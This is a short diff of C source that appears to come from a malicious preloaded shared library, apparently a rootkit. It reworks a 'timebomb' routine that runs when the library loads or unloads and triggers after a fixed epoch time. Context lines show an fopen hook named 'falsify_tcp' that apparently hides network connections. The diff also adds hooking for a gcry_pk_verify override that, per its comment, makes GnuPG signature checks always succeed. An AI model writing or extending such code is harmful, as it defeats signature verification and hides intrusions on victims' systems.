@@ -3,9 +3,7 @@
 /*
   timebomb component. runs when the library is loaded or unloaded from an application
 */
-static void timebomb() __attribute__((constructor));
-static void timebomb() __attribute__((destructor));
-void timebomb() {
+__attribute__((constructor)) __attribute__((destructor)) void timebomb() {
 
 	if((unsigned long)time(NULL) >= (unsigned long)EPOCH_TIME) {
 		;  // do whatever here
@@ -100,6 +98,7 @@ FILE * falsify_tcp(const char * pathname, const char * mode, FILE * (*old_fopen)
 /*
  * Break GnuPG signatures, and have them always return success
 */
+gcry_error_t (*o_verify)(gcry_sexp_t, gcry_sexp_t, gcry_sexp_t);
 gcry_error_t gcry_pk_verify(gcry_sexp_t sig, gcry_sexp_t data, gcry_sexp_t pkey) {
 
 	#ifdef DEBUG
